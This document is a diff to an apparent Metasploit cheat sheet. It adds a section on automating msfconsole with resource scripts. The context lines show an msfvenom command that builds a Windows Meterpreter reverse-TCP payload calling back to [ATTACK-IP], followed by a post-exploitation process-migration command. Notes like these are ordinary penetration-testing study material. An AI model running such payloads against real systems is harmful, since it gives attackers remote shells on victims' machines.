@@ -4,6 +4,7 @@
 * [Generating Payloads With Msfvenom](#generating-payloads-with-msfvenom)
 * [Encoding Payloads With Msfvenom](#encoding-payloads-with-msfvenom)
 * [Injecting Payloads Into Windows Portable Executables](#injecting-payloads-into-windows-portable-executables)
+* [Automation](#automation)
 * [References](#references)
 
 ***********************************************************************
@@ -164,6 +165,28 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e [E
 You can migrate into a new process by entering:
 ```
 run post/windows/manage/migrate
+```
+
+***********************************************************************
+
+## Automation
+
+Set up a resource script (.rc):
+* Put commands in a .rc file in sequential order
+
+From outside msfconsole:
+```
+msfconsole -r [SCRIPT.rc]
+```
+
+From inside msfconsoel:
+```
+resource [PATH-TO-.rc-FILE]
+```
+
+Make a .rc from last commands used in msfconsole:
+```
+makerc [OUTFILE]
 ```
 
 ***********************************************************************
